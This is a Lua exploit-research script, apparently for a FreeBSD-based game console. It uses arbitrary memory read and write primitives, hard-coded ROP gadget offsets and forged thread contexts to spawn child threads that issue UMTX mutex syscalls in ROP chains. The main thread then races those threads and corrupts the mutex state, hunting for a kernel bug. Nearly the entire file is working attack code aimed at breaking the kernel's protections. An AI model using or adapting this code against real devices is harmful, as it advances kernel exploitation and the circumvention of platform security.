-- CRASH_CLASS: MODERATE
-- PROBE 128b: UMTX PI race with syscall-capable child thread
--
-- Context: 127k-127n used ROP-only writers (child wrote values to mutex
-- word via mov [rdi],rax;ret). That never touches kernel UMTX internals.
-- 159a proved child threads can make real syscalls (RAX=432 thr_self worked).
--
-- THIS probe: child thread makes REAL UMTX_OP_MUTEX_LOCK/UNLOCK syscalls.
-- Two threads hammering lock/unlock on the same PI mutex creates kernel-side
-- contention on umtx_pi allocation, turnstile locking, and PI chain walks.
--
-- Child ROP chain per iteration:
--   pop rax → 454; pop rdi → mutex; pop rsi → 5 (LOCK); syscall
--   pop rax → 454; pop rdi → mutex; pop rsi → 6 (UNLOCK); syscall
--   pop rsp → loop
--
-- Detection: canary (getpid), VM counter (624), process survival.

print("=== PROBE 128b: UMTX SYSCALL RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Get syscall entry point (past the mov rax,116)
local sa = syscall.syscall_address
print("syscall_address=" .. fmt(sa))

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

-- Gadgets
local G = {
    ret     = 0x42,
    pop_rax = 0x992,
    pop_rsp = 0x9A2,
    pop_rdi = 0xC9DFE,
    pop_rsi = 0xD77D,
    pop_rdx = 0x3B02D7,
    mov_w   = 0x92C67,  -- mov [rdi],rax;ret
}

-- Allocations
local shared   = memory.alloc(0x4000)
local stk_buf  = memory.alloc(0x8000)
local ctx_buf  = memory.alloc(0x500)
local tid_buf  = memory.alloc(8)

local S   = N(shared)
local STK = N(stk_buf)
local BC  = N(ctx_buf)

local MTX_A = S           -- mutex A for section A/B
local MTX_B = S + 0x100   -- mutex B for section C
local SENTINEL = S + 0x200

-- Zero shared region
for off = 0, 0x3F8, 8 do wq(S + off, uint64("0x0")) end
wq(N(tid_buf), uint64("0x0"))

-- [A] Verify child can make UMTX syscalls
print("")
print("[A] Verify child UMTX syscall capability")

-- Build child ROP chain: lock mutex → write sentinel → unlock → loop
local CB = STK + 0x6000

-- LOCK (op 5)
wq(CB + 0x00, eaddr(G.pop_rax))
wq(CB + 0x08, uint64(454))              -- RAX = 454 (umtx op)
wq(CB + 0x10, eaddr(G.pop_rdi))
wq(CB + 0x18, shared)                    -- RDI = mutex addr
wq(CB + 0x20, eaddr(G.pop_rsi))
wq(CB + 0x28, uint64(5))                 -- RSI = 5 (MUTEX_LOCK)
wq(CB + 0x30, sa)                        -- syscall entry (mov r10,rcx; syscall; ret)

-- Write sentinel (proves child ran and lock returned)
wq(CB + 0x38, eaddr(G.pop_rdi))
wq(CB + 0x40, uint64(string.format("0x%X", SENTINEL)))
wq(CB + 0x48, eaddr(G.pop_rax))
wq(CB + 0x50, uint64("0xBBBBBBBBBBBBBBBB"))
wq(CB + 0x58, eaddr(G.mov_w))

-- UNLOCK (op 6)
wq(CB + 0x60, eaddr(G.pop_rax))
wq(CB + 0x68, uint64(454))
wq(CB + 0x70, eaddr(G.pop_rdi))
wq(CB + 0x78, shared)
wq(CB + 0x80, eaddr(G.pop_rsi))
wq(CB + 0x88, uint64(6))                 -- RSI = 6 (MUTEX_UNLOCK)
wq(CB + 0x90, sa)

-- Loop back
wq(CB + 0x98, eaddr(G.pop_rsp))
wq(CB + 0xA0, uint64(string.format("0x%X", CB)))

print(string.format("  chain at 0x%X, LOCK→sentinel→UNLOCK→loop", CB))

-- Build ucontext — initial registers set to 0 for R10, R8, R9
for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
wd(BC + 0x108, 0x480)     -- magic
wd(BC + 0xD0, 0)          -- flags MUST be 0
wd(BC + 0x110, 0x10000)   -- type
wd(BC + 0xC0, 0x43)       -- CS
wd(BC + 0x100, 0x3B)      -- SS

-- RIP = ret gadget, RSP = chain base
local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
wd(BC + 0xE0, rip_lo)
wd(BC + 0xE4, rip_hi)
local rsp_lo = CB % 0x100000000
local rsp_hi = math.floor(CB / 0x100000000)
wd(BC + 0xF8, rsp_lo)
wd(BC + 0xFC, rsp_hi)

-- Mutex starts at 0 (unlocked) — child should lock it immediately
wd(MTX_A, 0)
wd(MTX_A + 4, 0)

wq(N(tid_buf), uint64("0x0"))
local thr_ret = nil
pcall(function()
    thr_ret = mk(430)(ctx_buf, tid_buf, uint64(0))
end)
local child_tid = rq(N(tid_buf))
print(string.format("  thr_create ret=%s tid=%s", fmt(thr_ret), fmt(child_tid)))

if thr_ret == nil or N(thr_ret) ~= 0 then
    print("  THREAD CREATION FAILED!") return
end

-- Wait for sentinel
for i = 1, 200 do native.fcall_with_rax(stub, 20) end
local sent = rq(SENTINEL)
print(string.format("  sentinel=%s %s", fmt(sent),
    (sent and N(sent) ~= 0) and "CHILD MAKING SYSCALLS" or "NOT YET"))

local mtx_snap = rd(MTX_A)
if mtx_snap and mtx_snap < 0 then mtx_snap = mtx_snap + 0x100000000 end
print(string.format("  mutex word=0x%08X", mtx_snap or 0))

if not alive() then print("DIED in section A!") return end

-- [B] RACE: both threads lock/unlock same mutex, 500 iterations
print("")
print("[B] UMTX RACE: main + child on same mutex (500 iter)")

local sc_umtx = mk(454)
local lock_ok = 0
local lock_fail = 0
local lock_crash = 0
local unlock_ok = 0
local unlock_fail = 0
local unlock_crash = 0
local weird = 0
local ITERATIONS = 500

for iter = 1, ITERATIONS do
    -- TRYLOCK (op 4) — non-blocking to avoid deadlock
    local tr = nil
    local tok = pcall(function()
        tr = sc_umtx(shared, uint64(4), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if not tok then
        lock_crash = lock_crash + 1
    else
        local rv = tr and N(tr) or -999
        if rv == 0 then lock_ok = lock_ok + 1
        elseif rv == -1 or rv == 0xFFFFFFFFFFFFFFFF then lock_fail = lock_fail + 1
        else weird = weird + 1 end
    end

    -- UNLOCK (op 6)
    local ur = nil
    local uok = pcall(function()
        ur = sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if not uok then
        unlock_crash = unlock_crash + 1
    else
        local uv = ur and N(ur) or -999
        if uv == 0 then unlock_ok = unlock_ok + 1
        else unlock_fail = unlock_fail + 1 end
    end

    if not alive() then
        print(string.format("  *** DIED at iter %d ***", iter))
        break
    end

    if iter % 100 == 0 then
        local snap = rd(MTX_A) or 0
        if snap < 0 then snap = snap + 0x100000000 end
        print(string.format("  i=%d TL(ok=%d fail=%d crash=%d) UL(ok=%d fail=%d crash=%d) w=%d mtx=0x%08X",
            iter, lock_ok, lock_fail, lock_crash, unlock_ok, unlock_fail, unlock_crash, weird, snap))
    end
end

print(string.format("  FINAL: TL(ok=%d fail=%d crash=%d) UL(ok=%d fail=%d crash=%d) weird=%d",
    lock_ok, lock_fail, lock_crash, unlock_ok, unlock_fail, unlock_crash, weird))

if not alive() then print("  PROCESS DEAD — POSSIBLE KERNEL BUG!") return end

-- [C] RACE VARIANT: child locks with blocking MUTEX_LOCK, main corrupts and wakes
print("")
print("[C] Blocking child LOCK + main WAKE race")

-- New mutex at MTX_B
-- Child ROP chain: just MUTEX_LOCK in tight loop (blocks when owned)
local CB2 = STK + 0x4000

-- LOCK (op 5, blocking)
wq(CB2 + 0x00, eaddr(G.pop_rax))
wq(CB2 + 0x08, uint64(454))
wq(CB2 + 0x10, eaddr(G.pop_rdi))
wq(CB2 + 0x18, uint64(string.format("0x%X", MTX_B)))
wq(CB2 + 0x20, eaddr(G.pop_rsi))
wq(CB2 + 0x28, uint64(5))       -- MUTEX_LOCK (blocking)
wq(CB2 + 0x30, sa)

-- UNLOCK
wq(CB2 + 0x38, eaddr(G.pop_rax))
wq(CB2 + 0x40, uint64(454))
wq(CB2 + 0x48, eaddr(G.pop_rdi))
wq(CB2 + 0x50, uint64(string.format("0x%X", MTX_B)))
wq(CB2 + 0x58, eaddr(G.pop_rsi))
wq(CB2 + 0x60, uint64(6))       -- MUTEX_UNLOCK
wq(CB2 + 0x68, sa)

-- Loop
wq(CB2 + 0x70, eaddr(G.pop_rsp))
wq(CB2 + 0x78, uint64(string.format("0x%X", CB2)))

-- Build second child context
local ctx2 = memory.alloc(0x500)
local tid2 = memory.alloc(8)
local BC2 = N(ctx2)

for off = 0, 0x4BC, 4 do wd(BC2 + off, 0) end
wd(BC2 + 0x108, 0x480)
wd(BC2 + 0xD0, 0)
wd(BC2 + 0x110, 0x10000)
wd(BC2 + 0xC0, 0x43)
wd(BC2 + 0x100, 0x3B)
wd(BC2 + 0xE0, rip_lo)
wd(BC2 + 0xE4, rip_hi)
local rsp2_lo = CB2 % 0x100000000
local rsp2_hi = math.floor(CB2 / 0x100000000)
wd(BC2 + 0xF8, rsp2_lo)
wd(BC2 + 0xFC, rsp2_hi)

-- Start mutex as owned by main (so child blocks immediately)
wd(MTX_B, pid)  -- main "owns" it
wd(MTX_B + 4, 0)

wq(N(tid2), uint64("0x0"))
local thr2_ret = nil
pcall(function()
    thr2_ret = mk(430)(ctx2, tid2, uint64(0))
end)
local child2_tid = rq(N(tid2))
print(string.format("  child2: ret=%s tid=%s", fmt(thr2_ret), fmt(child2_tid)))

if thr2_ret == nil or N(thr2_ret) ~= 0 then
    print("  THREAD 2 CREATION FAILED — skipping section C")
else
    -- Let child block on the mutex
    for i = 1, 50 do native.fcall_with_rax(stub, 20) end

    -- Now race: main corrupts word + unlocks, child wakes with corrupted state
    local c_ok = 0
    local c_crash = 0
    local c_weird = 0
    for iter = 1, 200 do
        -- Set contested bit (simulates a waiter the kernel doesn't know about)
        local old = rd(MTX_B) or 0
        if old < 0 then old = old + 0x100000000 end
        wd(MTX_B, old + 0x80000000)  -- OR in CONTESTED

        -- MUTEX_WAKE (op 8) — wake any blocked waiter
        local wr = nil
        local wok = pcall(function()
            wr = sc_umtx(uint64(string.format("0x%X", MTX_B)), uint64(8),
                uint64(0), uint64(0), uint64(0), uint64(0))
        end)

        if not wok then c_crash = c_crash + 1
        elseif wr and N(wr) == 0 then c_ok = c_ok + 1
        else c_weird = c_weird + 1 end

        -- Clear mutex for next cycle
        wd(MTX_B, 0)
        wd(MTX_B + 4, 0)

        if not alive() then
            print(string.format("  *** DIED at C iter %d ***", iter))
            break
        end

        if iter % 50 == 0 then
            print(string.format("  C i=%d ok=%d crash=%d weird=%d", iter, c_ok, c_crash, c_weird))
        end
    end
    print(string.format("  C FINAL: ok=%d crash=%d weird=%d", c_ok, c_crash, c_weird))
end

-- [D] VM op delta check (detect kernel object leaks)
print("")
print("[D] Post-race VM check")
local sc624 = mk(624)
local vmd_ok, vmd_val = pcall(function() return sc624() end)
if vmd_ok then
    print(string.format("  vmd=%d", N(vmd_val)))
else
    print("  vmd=FAIL")
end

local mtx_a = rd(MTX_A) or 0
local mtx_b = rd(MTX_B) or 0
if mtx_a < 0 then mtx_a = mtx_a + 0x100000000 end
if mtx_b < 0 then mtx_b = mtx_b + 0x100000000 end
print(string.format("  mutex_a=0x%08X mutex_b=0x%08X", mtx_a, mtx_b))

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 128b COMPLETE ===")
